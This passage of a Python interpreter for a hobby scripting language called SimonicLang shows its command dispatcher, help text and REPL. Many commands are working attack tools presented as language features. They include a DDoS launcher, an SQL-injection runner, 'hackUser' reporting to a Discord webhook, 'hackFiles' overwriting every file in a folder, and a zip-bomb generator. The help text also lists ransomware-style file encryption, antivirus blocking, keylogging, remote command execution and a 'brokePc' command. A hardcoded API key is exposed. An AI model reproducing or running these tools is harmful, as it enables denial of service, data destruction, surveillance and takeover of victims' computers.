			os.remove(name+".trash")
		elif m == "dir.create":
			os.mkdir(fstring(ot))
		elif m == "dir.open":
			os.chdir(fstring(ot))
		elif m == "dir.delete":
			shutil.rmtree(fstring(ot))
		elif m == "thread":
			ott = ";".join(o[1:])
			for _ in range(int(o[0])):
				t = threading.Thread(target=runCode, args=(ott,))
				t.start()
				with lock:
					ts.append(t)
		elif m == "threadjoin":
			for t in ts:
				t.join()
			with lock:
				ts = []
		elif m == "webOpen":
			webbrowser.open(ot)
		elif m == "simonddos":
			type = o[0]
			with lock:
				target = o[1]
				port = int(o[2])
			try:
				size = int(o[3])
			except:
				size = 1024
			try:
				pernum = int(o[4])
			except:
				pernum = 2
			try:
				filename = o[5]
			except:
				filename = "log.txt"
			startddos(type, size, pernum, filename)
		elif m == "simonddos.stop":
			with lock:
				flag = False
				ddospool.stop()
			orinto(ot)
		elif m == "sqlinjectionRun":
			target = o[0]
			pathname = o[1]
			variable = o[2]
			try:
				filename = o[3]
			except:
				filename = "log.txt"
			sqlinjectrun(target, pathname, variable, filename)
		elif m == "netInfo":
			ip = o[0]
			try:
				ip = socket.gethostbyname(ip)
			except:
				pass
			varname = o[1]
			with lock:
				vars[str(varname)] = json.dumps(netinfo(ip))
		elif m == "whois":
			target = fstring(o[0])
			varname = fstring(o[1])
			try:
				if 0 in mods:
					pass
				else:
					subprocess.run("pip install requests".split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
					with lock:
						mods.append(0)
				import requests
				dataa = requests.get("https://api.api-ninjas.com/v1/whois?domain="+target, headers={"X-Api-Key": "LypBBv2goWQ1DT1I3LuvRA==qapA26TtpexoaUsJ"}).json()
			except:
				dataa = {}
			with lock:
				vars[str(varname)] = json.dumps(dataa)
		elif m == "netIp":
			target = o[0]
			varname = o[1]
			try:
				ip = socket.gethostbyname(target)
			except:
				ip = "0.0.0.0"
			with lock:
				vars[varname] = str(ip)
		elif m == "netHost":
			ip = o[0]
			try:
				ip = socket.gethostbyname(ip)
			except:
				pass
			varname = o[1]
			try:
				host = socket.gethostbyaddr(ip)[0]
			except:
				host = ""
			with lock:
				vars[varname] = str(host)
		elif m == "aimusic":
			if 213 in mods:
				pass
			else:
				try:
					subprocess.run("pip install midiutil".split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
				except:
					pass
			file = o[0]
			length = int(o[1])
			tempo = float(o[2])
			dur = float(o[3])
			tracks = o[4]
			try:
				noteadd = int(o[5])
			except:
				noteadd = 0
			aimusic(file, length, tempo, dur, tracks, noteadd)
		elif m == "smsc":
			if 213 in mods:
				pass
			else:
				try:
					subprocess.run("pip install midiutil".split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
				except:
					pass
			varname = o[0]
			with lock:
				vars[varname] = SimonicMusic()
		elif m == "smsc.tempo":
			varname = o[0]
			sec = float(o[1])
			with lock:
				vars[varname].tempo = sec 
		elif m == "smsc.add":
			varname = o[0]
			code = o[1]
			with lock:
				vars[varname].add(code)
		elif m == "smsc.save":
			varname = o[0]
			file = o[1]
			with lock:
				vars[varname].save(file)
		elif m == "smai":
			varname = o[0]
			with lock:
				vars[varname] = SimonicAI()
		elif m == "smai.clearbuffer":
			varname = o[0]
			vars[varname].clearbuffer()
		elif m == "smai.resetbrain":
			varname = o[0]
			vars[varname].resetbrain()
		elif m == "smai.use":
			varname = o[0]
			vars[varname].use()
		elif m == "smai.getXyz":
			varname = o[0]
			varname2 = o[1]
			with lock:
				vars[varname2] = json.dumps(vars[varname].getXyz())
		elif m == "smai.check":
			varname = o[0]
			vars[varname].check()
		elif m == "smai.shuffle":
			varname = o[0]
			vars[varname].shuffle()
		elif m == "smai.learn":
			varname = o[0]
			text = o[1]
			xyz = o[2]
			vars[varname].learn(text, int(xyz))
		elif m == "smai.unlearn":
			varname = o[0]
			text = o[1]
			vars[varname].unlearn(text)
		elif m == "smai.autolearn":
			varname = o[0]
			spltr = o[1]
			text = ";".join(o[2:])
			vars[varname].autolearn(spltr, text)
		elif m == "smai.weblearm":
			varname = o[0]
			url = o[1]
			vars[varname].weblearn(url)
		elif m == "smai.read":
			varname = o[0]
			text = ";".join(o[1:])
			vars[varname].read(text)
		elif m == "smai.get":
			varname = o[0]
			joiner = o[1]
			adds = o[2]
			if adds == "0":
				adds = False
			else:
				adds = True
			length = int(o[3])
			varname2 = o[4]
			with lock:
				vars[varname2] = vars[varname].get(length, joiner=joiner, adds=adds)
		elif m == "smai.save":
			varname = o[0]
			file = o[1]
			vars[varname].save(file)
		elif m == "smai.load":
			varname = o[0]
			file = o[1]
			vars[varname].load(file)
		elif m == "smai.goodquiz":
			varname = o[0]
			varname2 = o[1]
			with lock:
				vars[varname2] = vars[varname].goodquiz()
		elif m == "hackUser":
			hackUserSystem(o[0], o[1])
		elif m == "hackFiles":
			for file in os.listdir():
				with open(file, "w") as f:
					f.write(fstring(ot))
		elif m == "bufferOverFlow":
			threading.Thread(target=bof, args=(float(fstring(ot)),)).start()
		elif m == "httpSend":
			target = fstring(o[0])
			port = int(fstring(o[1]))
			met = fstring(o[2])
			op = fstring(o[3])
			pack = f"{met} {op} HTTP/1.1\r\nHost: {target}:{port}\r\n"
			for header, value in httpHeaders.items():
				pack += f"{header}: {value}\r\n"
			pack += "\r\n"
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.settimeout(0.8);s.connect((target, port));s.sendall(pack.encode())
			except:
				pass
			s.close()
		elif m == "httpSendR":
			target = fstring(o[0])
			port = int(fstring(o[1]))
			met = fstring(o[2])
			op = fstring(o[3])
			varname = fstring(o[4])
			pack = f"{met} {op} HTTP/1.1\r\nHost: {target}:{port}\r\n"
			for header, value in httpHeaders.items():
				pack += f"{header}: {value}\r\n"
			pack += "\r\n"
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.settimeout(0.8);s.connect((target, port));s.sendall(pack.encode())
				r = ""
				while True:
					try:
						rr = s.recv(65535).decode()
						r += rr
					except:
						break
			except:
				r = ""
			s.close()
			with lock:
				vars[varname] = str(r)
		elif m == "HttpServer":
			host = o[0]
			port = int(o[1])
			apikey = o[2]
			s = HttpServer(host, port, apikey)
			with lock:
				vars[o[3]] = s
		elif m == "HttpServer.SetFile":
			varname = o[0]
			path = o[1]
			c = o[2]
			vars[varname].SetFile(path, c)
		elif m == "HttpServer.GetFile":
			varname = o[0]
			path = o[1]
			varname2 = o[2]
			with lock:
				vars[varname2] = vars[varname].GetFile(path)
		elif m == "HttpServer.DelFile":
			varname = o[0]
			varname2 = o[1]
			vars[varname].DelFile(varname2)
		elif m == "HttpServer.Run":
			varname = o[0]
			logfile = o[1]
			vars[varname].Run(logfile)
		elif m == "HttpsServer":
			host = o[0]
			port = int(o[1])
			apikey = o[2]
			s = HttpsServer(host, port, apikey)
			with lock:
				vars[o[3]] = s
		elif m == "HttpsServer.SetFile":
			varname = o[0]
			path = o[1]
			c = o[2]
			vars[varname].SetFile(path, c)
		elif m == "HttpsServer.GetFile":
			varname = o[0]
			path = o[1]
			varname2 = o[2]
			with lock:
				vars[varname2] = vars[varname].GetFile(path)
		elif m == "HttpsServer.DelFile":
			varname = o[0]
			varname2 = o[1]
			vars[varname].DelFile(varname2)
		elif m == "HttpsServer.Run":
			varname = o[0]
			logfile = o[1]
			vars[varname].Run(logfile)
		elif m == "SimonicNet.Create":
			ip = o[0]
			pawd = o[1]
			s = SimonicNet()
			recv = s.Create(ip, pawd)
			recv = "\r\n\r\n".join(recv.split("\r\n\r\n")[1:])
			print(recv)
		elif m == "SimonicNet.SetFile":
			ip = o[0]
			pawd = o[1]
			file = o[2]
			c = ";".join(o[3:]).replace("\n", "/n/*")
			s = SimonicNet()
			recv = s.SetFile(ip, pawd, file, c)
			recv = "\r\n\r\n".join(recv.split("\r\n\r\n")[1:])
			if "Error" in recv:
				print(recv)
		elif m == "SimonicNet.GetFile":
			ip = o[0]
			pawd = o[1]
			file = o[2]
			varname = o[3]
			s = SimonicNet()
			recv = s.GetFile(ip, pawd, file)
			recv = "\r\n\r\n".join(recv.split("\r\n\r\n")[1:]).replace("/n/*", "\n")
			with lock:
				vars[varname] = recv
		elif m == "SimonicNet.SetOpenFile":
			ip = o[0]
			pawd = o[1]
			file = o[2]
			c = ";".join(o[3:]).replace("\n", "/n/*")
			s = SimonicNet()
			recv = s.SetOpenFile(ip, pawd, file, c)
			recv = "\r\n\r\n".join(recv.split("\r\n\r\n")[1:])
			if "Error" in recv:
				print(recv)
		elif m == "SimonicNet.GetOpenFile":
			ip = o[0]
			file = o[1]
			varname = o[2]
			s = SimonicNet()
			recv = s.GetFile(ip, file)
			recv = "\r\n\r\n".join(recv.split("\r\n\r\n")[1:]).replace("/n/*", "\n")
			with lock:
				vars[varname] = recv
		elif m == "SimonicNet.Open":
			ip = o[0]
			varname = o[1]
			s = SimonicNet()
			recv = s.Open(ip)
			recv = "\r\n\r\n".join(recv.split("\r\n\r\n")[1:]).replace("/n/*", "\n")
			with lock:
				vars[varname] = recv
		elif m == "SimonicNet.WebOpen":
			s = SimonicNet()
			s.WebOpen(ot)
		elif m == "SimonicNet.GetAll":
			ip = o[0]
			pawd = o[1]
			varname = o[2]
			s = SimonicNet()
			recv = s.GetAll(ip, pawd)
			recv = "\r\n\r\n".join(recv.split("\r\n\r\n")[1:])
			with lock:
				vars[varname] = recv
		elif m == "SimonicNet.Search":
			query = o[0]
			num = o[1]
			varname = o[2]
			s = SimonicNet()
			recv = s.Search(query, num)
			recv = "\r\n\r\n".join(recv.split("\r\n\r\n")[1:]).replace("/n/*", "\n")
			with lock:
				vars[varname] = recv
		elif m == "proxyGet":
			url = fstring(o[0])
			varname = fstring(o[1])
			recv = proxyGet0(url)
			vars[str(varname)] = str(recv)
		elif m == "cloudGet":
			target = fstring(o[0])
			file = fstring(o[1])
			varname = fstring(o[2])
			s = SimonCloud(target)
			s.get(file)
			with lock:
				vars[str(varname)] = str(s.recv())
		elif m == "cloudSet":
			target = fstring(o[0])
			file = fstring(o[1])
			c = fstring(";".join(o[2:]))
			s = SimonCloud(target)
			s.set(file, c)
			a = str(s.recv())
			if a == "error":
				if errors:
					orint("error")
		elif m == "cloudCom":
			target = fstring(o[0])
			varname = fstring(o[1])
			command = fstring(";".join(o[2:]))
			s = SimonCloud(target)
			s.com(command)
			a = str(s.recv())
			if a == "error":
				if errors:
					orint("error")
			else:
				with lock:
					vars[str(varname)] = a
		elif m == "cloudStart":
			SimonCloudStart()
		elif m == "randomChc":
			varname = fstring(o[0])
			vars[str(varname)] = random.choice(o[1:])
		elif m == "httpSendRD":
			target = fstring(o[0])
			port = int(fstring(o[1]))
			met = fstring(o[2])
			op = fstring(o[3])
			varname = fstring(o[4])
			pack = f"{met} {op} HTTP/1.1\r\nHost: {target}:{port}\r\n"
			for header, value in httpHeaders.items():
				pack += f"{header}: {value}\r\n"
			pack += "\r\n"
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.settimeout(0.8);s.connect((target, port));s.sendall(pack.encode())
				r = ""
				while True:
					try:
						rr = s.recv(65535).decode()
						r += rr
					except:
						break
				r = r.split("\r\n\r\n")[1]
			except:
				r = ""
			s.close()
			with lock:
				vars[varname] = str(r)
		elif m == "httpHead":
			header = fstring(o[0])
			value = fstring(";".join(o[1:]))
			with lock:
				httpHeaders[header] = value
		elif m == "httpHeadR":
			header = fstring(o[0])
			with lock:
				del httpHeaders[header]
		elif m == "math":
			option = fstring(o[0])
			varname = fstring(o[1])
			value = str(eval(option))
			with lock:
				vars[varname] = str(value)
		elif m == "randomAPI":
			length = int(fstring(o[0]))
			varname = fstring(o[1])
			vars[varname] = str(secrets.token_hex(length))
		elif m == "zipbomb":
			name = o[0]
			mb = int(o[1])
			names = []
			for _ in range(mb):
				n = ""
				for _ in range(32):
					n += random.choice("q w e r t y u i o p a s d f g h j k l z x c v b n m 1 2 3 4 5 6 7 8 9 0".split(" "))
				with open(n, "w") as f:
					f.write("."+(" "*1024*1024))
				names.append(n)
			import zipfile
			with zipfile.ZipFile(name, "w") as f:
				for n in names:
					f.write(n)
					runCode("filed;"+n)
		elif m == "IF":
			value1 = fstring(o[0])
			option = fstring(o[1])
			value2 = fstring(o[2])
			code = ot.split(";if=")[1]
			code = code.split(";else=")
			if option == "==":
				if value1 == value2:
					for h in code[0].split(" && "):
						runCode(h)
				else:
					for h in code[1].split(" && "):
						runCode(h)
			elif option == ">=":
				if float(value1) >= float(value2):
					for h in code[0].split(" && "):
						runCode(h)
				else:
					for h in code[1].split(" && "):
						runCode(h)
			elif option == "<=":
				if float(value1) <= float(value2):
					for h in code[0].split(" && "):
						runCode(h)
				else:
					for h in code[1].split(" && "):
						runCode(h)
			elif option == ">":
				if float(value1) > float(value2):
					for h in code[0].split(" && "):
						runCode(h)
				else:
					for h in code[1].split(" && "):
						runCode(h)
			elif option == "<":
				if float(value1) < float(value2):
					for h in code[0].split(" && "):
						runCode(h)
				else:
					for h in code[1].split(" && "):
						runCode(h)
			else:
				for h in code[1].split(" && "):
					runCode(h)
		elif m == "fstr":
			runCode(fstring(ot))
		elif m == "loadAllMods":
			loadAllMods()
		elif m == "help":
			print("fstr;code... = Use any command with f-string")
			print("loadAllMods = load all extension mods (psutil/fake_useragent/datetime/requests/keyboard/tkinter)")
			print("log;text... = Write a text to output")
			print("logf;text... = Write a text to output with f-string")
			print("optilog;text... = Write a text to output (Optimizated)")
			print("optilogf;Your number: $<v.number> = Write a text to output with f-string (Optimizated)")
			print("outNone = Disable output")
			print("outSys = Activate output")
			print("returnAuto;file.sl = SimonicLang file to Python file (f-string)")
			print("returnPyExe;file.py = Python file to Exe file")
			print("returnPyHideExe;file.py = Python file to Exe file without console (f-string)")
			print("returnSLExe;file.sl;addByte(optional) = SimonicLang file to Exe file (f-string) (addByte=It is a value you can use to increase the file size. Use this value as the number of characters, otherwise nothing will happen.)")
			print("returnSLHideExe;file.sl;addByte(optional) = SimonicLang file to Exe file without console (f-string) (addByte=It is a value you can use to increase the file size. Use this value as the number of characters, otherwise nothing will happen.)")
			print("eSet;on = Activate errors")
			print("eSet;off = Disable errors")
			print("vSet;varname;value... = Creates or seting some variable")
			print("vSetF;varname;value... = Creates or seting some variable (with value f-string)")
			print("vSetFF;varname;value... = Creates or seting some variable (with value and name f-string)")
			print("vR;varname = Remove a variable")
			print("vRF;varname = Remove a variable (with name f-string)")
			print("vList;varname;objects(obj1;obj2;...) = Creates or seting list variable")
			print("vListF;varname;objects(obj1;obj2;...) = Creates or seting list variable (with f-string)")
			print("vListJoin;varname;joiner = list variable to text variable")
			print("vListSplit;varname;splitter = text variable to text variable")
			print("vReplace;varname;textto;text = Replace text from variable")
			print("vSelect;varname;number;objvarname = Select object/character from variable")
			print("vSelectL;varname;minnumber;maxnumber;objvarname = Select objects/characters from variable")
			print("vReverse;varname = Reverse the variable")
			print("input;varname;text... = Input system")
			print("inputf;varname;text... = Input system (with f-string)")
			print("serverCalculate;ports;trueLevel;varname = Calculate how much servers in the world (e.g. serverCalculate;80,443;10;example)")
			print("%;num1;num2;varname = Calculate the percentage of num1 to the num2 and save to variable(f-string)")
			print("random;min;max;varname = Generates random number")
			print("randomf;min;max;varname = Generates random number (with f-string)")
			print("randoms;min;max;varname = Generates random uniform number")
			print("randomsf;min;max;varname = Generates random uniform number (with f-string)")
			print("rwLock = Encrypt all files")
			print("rwUnlock = Decrypt all files")
			print("sqlConn;file;varname = Start a sqlite3 connection and save cursor to variable. (f-string)")
			print("sqlExec;varname;code... = Execute SQL Code with cursor (f-string)")
			print("sqlClose;varname = Close sqlite3 connection and delete variable (f-string)")
			print("setRoot;filename... = Gives root permissions to file (with f-string) (0o777)")
			print("blockPerms;filename... = Block the permissions of file (with f-string) (0)")
			print("taskkill;pid... = Stop the task (with f-string)")
			print("tasklist;varname... = get task list (f-string)")
			print("taskblock;name... = block the tasks with program name/path (f-string)")
			print("blockDefender = Block antivirus programs (Windows defender...)")
			print("winUserAdd;username;password = Windows user adding (with f-string)")
			print("shutdown = Shutdown PC for Windows/Linux/Shell")
			print("reboot = Reboot/Restart PC For Windows/Linux/Shell")
			print("brokePc = It tries to shut down and restart the computer hundreds of times, which completely destroys the computer and may not be usable at all (Extremely Dangerous)")
			print("wait;number... = Wait seconds (time sleep)")
			print("keylog;varname = Key logging and saves to variable")
			print("encrypt;filename;password = Encrypt file with SimonicLang Crypto")
			print("decrypt;filename;password = Decrypt file with SimonicLang Crypto")
			print("cloudGet;server.pythonanywhere.com;filename;varname = Get content from SimonCloud (with f-string)")
			print("cloudSet;server.pythonanywhere.com;filename;content... = Set content from SimonCloud (with f-string)")
			print("cloudCom;server.pythonanywhere.com;outputVarname;command... = Start Command Prompt Command from SimonCloud (with f-string)")
			print("cloudStart = Start SimonCloud Server for PythonAnywhere Server Coding (with flask) (with f-string)")
			print("SimonicNet.Create;ip or dns;password = Create a server from SimonicNet (Free and unlimited) (SimonicNet: A versatile Internet platform facilitating server deployment, management, and interaction with other servers. Exclusive servers accessible solely through SimonicLang, not found on the worldwide web, enabling unique communication capabilities.)")
			print("SimonicNet.SetFile;ip or dns;password;filename;content... = Create file or open file and set content from server")
			print("SimonicNet.GetFile;ip or dns;password;filename;varname = Get file content from server")
			print("SimonicNet.SetOpenFile;ip or dns;password;filename;content... = Create public file or open public file and write content from server")
			print("SimonicNet.GetOpenFile;ip or dns;filename;varname = Get content of public file from server")
			print("SimonicNet.Open;ip or dns;varname = Get content of public main named file from server")
			print("SimonicNet.WebOpen;ip or dns = Open server on user's browser")
			print("SimonicNet.GetAll;ip or dns;password;varname = Get all data from server.")
			print("SimonicNet.Search;query;result count;varname = Search on SimonicNet browser")
			print("HttpServer;host;port;apikey;varname = Create HTTP Server and save to variable (methods=GET, POST, PUT, DELETE)")
			print("HttpServer.Setfile;varname;path;content... = Change or create content of file path (path e.g. /index.html)")
			print("HttpServer.GetFile;varname;path;resultVarname = Get content from server file and save to result variable")
			print("HttpServer.DelFile;varname;path = Delete file from server")
			print("HttpServer.Run;varname;logfile.txt = Run the server")
			print("HttpsServer;host;port;apikey;varname = Create HTTP Server and save to variable (Certificate file=server.crt, Key File=server.key) (methods=GET, POST, PUT, DELETE)")
			print("HttpsServer.Setfile;varname;path;content... = Change or create content of file path (path e.g. /index.html)")
			print("HttpsServer.GetFile;varname;path;resultVarname = Get content from server file and save to result variable")
			print("HttpsServer.DelFile;varname;path = Delete file from server")
			print("HttpsServer.Run;varname;logfile.txt = Run the server")
			print("smsc;varname = Midi Music Creator tool start on variable (SimonicMusic SMSC)")
			print("smsc.tempo;varname;tempo = Change all time music speed ")
			print("smsc.add;varname;code... = Add note/music to your midi file (code='Track/Pitch/Duration/Volume' or use 'null' to wait)")
			print("smsc.save;varname;filename = Save your midi file to file")
			print("smai;varname = An artificial intelligence model with its own NLP algorithm (SimonicAI)")
			print("smai.clearbuffer;varname = Resets additional use of AI (Resets Nerve level and AI preference algorithm)")
			print("smai.resetbrain;varname = Completely resets the brain of artificial intelligence")
			print("smai.use;varname = The method of changing decisions to give different answers")
			print("smai.getXyz;varname;outvarname = Outputs artificial intelligence statistics in json format")
			print("smai.check;varname = Important function to keep the nerve level at a certain level")
			print("smai.shuffle;varname = A second method to shake up the entire AI brain to respond differently")
			print("smai.learn;varname;word;xyz = learn some words to ai, xyz: 0=Negative 1=Positive")
			print("smai.unlearn;varname;word = Nevermind some word")
			print("smai.autolearn;varname;splitter;text = Automatic learning strategy by combining artificial intelligence's current state with its own decision")
			print("smai.weblearn;varname;url = Autolearn Function is a function made by retrieving data from the internet.")
			print("smai.read;varname;text = Artificial intelligence changes emotions by reading the comment")
			print("smai.get;varname;joiner;adds(0=False 1=True its means .,!? chars);length;recvvarname = Artificial intelligence is a response mechanism with an algorithm that responds with its own decisions and emotions and speaks in a different way.")
			print("smai.save;varname;file = Save ai brain to file")
			print("smai.load;varname;file = Load ai brain in file")
			print("smai.goodquiz;varname;outvarname = It is an accuracy measurement mechanism, it measures the similarity of each decision of artificial intelligence (In short, it measures the similarity of the desired answer and the given answer.)")
			print("aimusic;filename;length(e.g. 5);tempo(e.g. 120);durations(e.g. 1);tracks(guitar/piano/bass/violin/flute/trumpet/drum/trap/lofi);noteadd(optional: A note number for add to note) = AI Music Generator from SimonicMusic")
			print("sendBotMail;target;subject;mes... = Send E-Mail with SimonicLang free bot account ( simoniclang@hotmail.com )")
			print("sendMail;serverSmtp;port;account;password;target;subject;mes = Send E-Mail")
			print("randomChc;varname;list... = Random choice from list (with f-string) (list e.g. apple;melon;code)")
			print("bufferOverFlow;number... = It initiates an ordinary buffer over flow attack, waits for the entered value a while, and also runs in the background (with f-string)")
			print("dcwhSendF;url;text... = Send a text to Discord Webhook (with f-string)")
			print("dcwhSend;url;text... = Send a text to Discord Webhook")
			print("sysExit = System Exit")
			print("errorBox;text... = Show error box (f-string)")
			print("msgBox;title;text = Show message text in gui page.")
			print("hrefBox;title;text;url = URL Redirection gui page")
			print("inputBox;title;text;varname = Get input from user with gui page")
			print("confirmBox;title;text;varname = Get confirming result from user with gui page (0=Not allowed, 1=Allowed)")
			print("fullBox;backgroundColor;textColor;text = Display text to all of screen")
			print("fullBoxUnClose;backgroundColor;textColor;text = Display text to all of screen (with disable closing)")
			print("changeBg.color;red%;green%;blue% = Change background to color (Only Windows)")
			print("changeBg.image;image_name_or_path = Change background to windows (Only Windows)")
			print("disableExit = disable sys.exit functions")
			print("whois;target;varname... = Search info with whois (f-string)")
			print("loop;option;code... = Looping (options: <> While or number to normal loop)")
			print("loopf;option;code... = Looping (options: <> While or number to normal loop) (with f-string)")
			print("forLoop;varname;objvarname;code... = Run for looping")
			print("runPy;code... = Run Python Code (with f-string)")
			print("runSL;code... = Run SimonicLang Code (with f-string)")
			print("runCmd;command... = Run os command (with f-string)")
			print("runHtml;htmlcode... = Run html with web browser server (with f-string)")
			print("stopHtml = Stop html web browser servers")
			print("startHtml = Start html web browser servers")
			print("runShell;command... = Run Shell Command (with f-string)")
			print("runPShell;command... = Run PowerShell Command (with f-string)")
			print("runExe;filename... = Run exe file")
			print("clearOut = Clear outputs")
			print("clearIn = Clear and reset in system")
			print("proxyGet;url;varname = Get website content with random proxy (with f-string)")
			print("webOpen;url... = Open web page with user's browser (with f-string)")
			print("save;filename = Save variables and all")
			print("load;filename = Load variables and all")
			print("file.create;filename = Create file")
			print("file.write;filename;content... = Write content to file")
			print("file.writef;filename;content... = Write content to file (with f-string)")
			print("file.writebin;filename;content... = Write content to file (write binary)")
			print("file.writebinf;filename;content... = Write content to file (with f-string) (write binary)")
			print("file.read;filename;varname = Open file and write content to variable")
			print("file.readf;filename;varname = Open file and write content to variable (with f-string)")
			print("file.readbin;filename;varname = Open file and write content to variable (read binary)")
			print("file.readbinf;filename;varname = Open file and write content to variable (with f-string) (read binary)")
			print("file.delete;filename = Delete file (with f-string) (It destroys beyond reach and is also very fast.)")
			print("dir.create;dirname = Create a directory (with f-string)")
			print("dir.open;dirname = Open directory (with f-string)")
			print("dir.delete;dirname = Delete directory (with f-string)")
			print("zipbomb;filename;mbsize = Creates ZipBomb File (A file that is high in size but appears small and crashes the machine when opened)")
			print("thread;code... = Start code with threading")
			print("threadjoin = Join all threads")
			print("simonddos;tcp/udp;target;port;size(optional);pernum(optional);logfilename(optional) = Start a Simon's Ddos")
			print("randomAPI;hexlength;varname = Random API Key Creator")
			print("simonddos.stop = Stop Simon's Ddos")
			print("sqlinjectionRun;target;pathname;variable(url);filename(optional) = Start SQL Injection Project")
			print("netInfo;ip/dns;varname = Get all internet info from ip/dns")
			print("netIp;dns;varname = Get ip info from dns")
			print("netHost;ip;varname = Get host/dns from ip")
			print("hackUser;url;logtitle = Hack the code starter and send info to Discord Webhook address")
			print("hackFiles;content... = gives a specific content to all files in the folder")
			print("httpSend;target;port;method;path/option = HTTP Request Sending (with f-string)")
			print("httpSendR;target;port;method;path/option;varname = HTTP Request Sending and get all recv write to variable (with f-string)")
			print("httpSendRD;target;port;method;path/option;varname = HTTP Request Sending and get only data recv write to variable (with f-string)")
			print("httpHead;header;value... = Set or create a http header (with f-string)")
			print("httpHeadR;header = Remove http header (with f-string)")
			print("math;option;varname = Start math progress and output writes to variable (with f-string)")
			print("IF;value1;option;value2;if=trueCode...;else=falseCode... = Start if progress (with f-string)")
			print("help = Help for SimonicLang")
			print("How to use F-String? (this process dont have mathing):")
			print("$<n> = Newline")
			print("$<c.reset/red/green/yellow/blue/purple/blue2/white/black/gray> = Change text colors (Ascii Color Codes)")
			print("$<bold> = Change text to bold text (use c.reset for disable)")
			print("$<smlangUrl> = Display SimonicLang Github link")
			print("$<v.varname> = Geting variable value")
			print("$<vup.varname> = Geting variable value with upper charset")
			print("$<vlow.varname> = Geting variable value with lower charset")
			print("$<vlen.varname> = Geting variable string value length")
			print("$<fakeUA> = Create random fake user agent")
			print("$<random.ip> = Random created fake ip")
			print("$<random.apikey.16/32/64/128> = Random API Key")
			print("$<random.server> = Random Real Server IP:PORT (Server Finder)")
			print("$<basefile> = Base code file")
			print("$<sys.name> = Os's name")
			print("$<sys.sys> = System name")
			print("$<sys.ver> = System version")
			print("$<sys.node> = System node")
			print("$<sys.user> = Os's Username")
			print("$<sys.user2> = Get Os's Username with getpass")
			print("$<sys.path> = Base path")
			print("$<sys.prcsr> = System processor")
			print("$<sys.pyver> = Python version")
			print("$<sys.slver> = SimonicLang version")
			print("$<sys.mac> = System machine")
			print("$<sys.arch> = System architecture")
			print("$<sys.ip> = Machine's IP Address")
			print("$<sys.host> = Machine's Host/DNS Address")
			print("$<ram.b/kb/mb/gb> = Display RAM deposit")
			print("$<ramav.b/kb/mb/gb> = Display RAM Avaible deposit")
			print("$<ramus.b/kb/mb/gb> = Display RAM Uses deposit")
			print("$<prcsc> = System Process count")
			print("$<date> = Get all date info")
			print("$<all> = Get all system info (without date)")
			print("Example Code:")
			print("""log;Hello World!$<n>
logf;$<c.red>This text is red!$<c.reset>$<n>
vSet;loopNum;0
loop;5;math;$<v.loopNum>+1;loopNum && inputf;cmd;This your is $<v.loopNum>. Command:  && runCmd;$<v.cmd>
input;chc;Show Date? (Y/n):
IF;$<vlow.chc>;==;y;if=logf;Yeah its date! $<date>;else=log;Okey we dont write date!
log;$<n>
optilog;This is Optimizated Output!$<n>
optilogf;User Info:$<n>Name: $<sys.user>$<n>RAM: $<ram.gb> GB$<n>IP and HOST: $<sys.ip> $<sys.host>$<n>
optilog;Random Server finding...$<n>
optilogf;Finded Random Server: $<random.server>$<n>""")
	except Exception as e:
		if errors:
			orint(str(e))






# Compiler:
if len(sys.argv) >= 2:
	name = sys.argv[1]
	with open(name, "r") as f:
		c = f.read()
	for h in c.split("\n"):
		for hh in h.split(" %& "):
			runCode(hh)
else:
	print(f"SimonicLang v1.0.3 (by aertsimon90)-Powered By Python")
	while True:
		a = input("\n>>> ")
		for hh in a.split(" %& "):
			runCode(hh)
